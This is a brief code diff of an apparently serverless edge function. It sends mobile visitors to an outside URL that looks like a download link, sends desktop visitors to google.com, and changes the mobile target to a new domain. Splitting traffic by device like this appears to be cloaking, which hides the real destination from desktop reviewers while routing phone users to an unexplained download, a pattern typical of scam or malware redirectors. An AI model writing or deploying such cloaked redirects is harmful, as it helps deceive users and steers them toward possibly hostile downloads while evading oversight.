@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://psivora.com/go/promax", 302);
+    return Response.redirect("https://miumtag.com/dl/236812", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
